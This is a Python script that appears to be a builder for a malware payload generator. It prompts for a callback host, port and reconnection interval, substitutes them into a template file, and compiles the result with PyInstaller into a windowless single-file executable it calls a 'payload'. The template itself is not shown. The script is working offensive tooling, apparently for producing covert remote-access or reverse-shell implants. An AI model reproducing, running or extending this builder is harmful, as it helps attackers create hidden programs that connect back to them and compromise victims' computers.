import os
import click
import shutil
import platform
import subprocess

# absolute paths
current_directory = os.getcwd()
source_code = os.path.join(current_directory,'module_builder','source_code.txt')

# colors
red = "\033[31m"
gray = "\033[90m"
blue = "\033[34m"
reset = "\033[0m"
green = "\033[32m"

@click.command()
@click.option("--name", type=str ,prompt="[+] Set Name")
@click.option("--host", type=str ,prompt="[+] Set Host")
@click.option("--port", type=int ,prompt="[+] Set Port")
@click.option("--time", type=str ,prompt="[+] Set Reconnection Time")
def main(name, host, port, time):

    click.echo("[*] Generating payload, PLease wait...")

    file_name = name + '.py'

    source_file = open('module_builder/source_code.txt', 'r')
    source = source_file.read()
    source_file.close()

    payload_file = open('source/' + file_name, 'w')
    payload_file.write(source)
    payload_file.close()

    with open('source/' + file_name, 'r') as file:
        code = file.read()
        code = code.replace('<TIME>', time)
        code = code.replace('<HOST>', host)
        code = code.replace('<PORT>', str(port))
        file.close()

    with open('source/' + file_name, 'w') as file:
        file.write(code)
        file.close()

    # check system and then run pyinstaller command to compile code into exe.
    command = f"pyinstaller --onefile --noconsole source/{file_name}"
    check_system(command)

    # delete unwanted files and dir
    cleanup(name)
    print(f"{green}[*] Payload saved as {name}.exe in '/dist' directory.{reset}")


def check_system(command):
    if platform.system() == 'Windows':
        subprocess.run(command, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else:
        subprocess.run(command, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, executable='/bin/bash')

def cleanup(name):
    os.remove(name + '.spec')
    shutil.rmtree("build")